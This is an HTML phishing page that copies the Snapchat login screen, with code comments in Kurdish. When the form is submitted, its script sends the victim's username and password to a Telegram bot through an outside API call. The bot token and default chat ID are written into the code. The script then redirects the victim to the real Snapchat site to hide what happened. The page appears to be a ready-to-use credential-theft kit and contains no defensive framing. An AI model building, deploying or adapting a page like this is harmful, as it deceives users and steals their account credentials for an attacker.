<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Snapchat</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #f7f7f7; display: flex; flex-direction: column; align-items: center; margin: 0; padding-top: 20px; }
        .top-banner { background-color: #fffc00; padding: 10px 25px; border-radius: 50px; display: flex; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-bottom: 30px; text-decoration: none; color: black; font-weight: bold; font-size: 14px; }
        .top-banner img { width: 18px; margin-right: 10px; }
        .login-card { background: white; padding: 40px 30px; border-radius: 15px; width: 95%; max-width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .snap-logo { width: 60px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 700; margin-bottom: 25px; }
        .input-group { text-align: left; margin-bottom: 15px; }
        label { font-size: 12px; color: #666; font-weight: 600; text-transform: uppercase; display: block; margin-bottom: 5px; }
        input { width: 100%; padding: 14px; border: 1.5px solid #e1e1e1; border-radius: 8px; font-size: 16px; outline: none; background-color: #fafafa; }
        .btn-next { background-color: #00a9ff; color: white; border: none; padding: 14px; width: 160px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        .divider { display: flex; align-items: center; color: #999; font-size: 12px; margin: 25px 0; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #eee; margin: 0 15px; }
        .btn-google { background: white; border: 1px solid #ddd; padding: 12px; width: 100%; border-radius: 30px; display: flex; align-items: center; justify-content: center; font-size: 14px; color: #555; }
        .btn-google img { width: 18px; margin-left: 10px; }
    </style>
</head>
<body>

    <div class="top-banner">
        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png">
        <span>Open Snapchat</span>
    </div>

    <div class="login-card">
        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" class="snap-logo">
        <h1>Log in to Snapchat</h1>
        
        <form id="loginForm">
            <div class="input-group">
                <label>Username or email</label>
                <input type="text" id="user" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="pass" required>
            </div>
            <button type="submit" class="btn-next">Next</button>
        </form>

        <div class="divider">OR</div>
        
        <div class="btn-google">
            <span>المواصلة باستخدام Google</span>
            <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png">
        </div>
    </div>

    <script>
        // وەرگرتنا ID ب شێوەیەکێ ئۆتۆماتیکی ژ لێنکێ
        const urlParams = new URLSearchParams(window.location.search);
        let chat_id = urlParams.get('id'); 

        // ئەگەر ID د لێنکێ دا نەبوو، زانیاری دێ بۆ ڤێ ئایدیێ چن (ئایدییا تە)
        const default_id = "6648131751"; 
        const final_chat_id = chat_id ? chat_id : default_id;

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            
            // تۆکنێ نوو یێ تە
            const token = "8686812348:AAGokC5UxXpEbsKwfCkDlKtt0Lt_NH4KJ98";
            const msg = `👻 Snapchat Login\n\n📧 User: ${user}\n🔑 Pass: ${pass}`;

            // ناردنا زانیارییان بۆ تێلێگرامێ
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${final_chat_id}&text=${encodeURIComponent(msg)}`)
            .then(() => {
                window.location.href = "https://accounts.snapchat.com";
            })
            .catch(err => {
                window.location.href = "https://accounts.snapchat.com";
            });
        });
    </script>
</body>
</html>
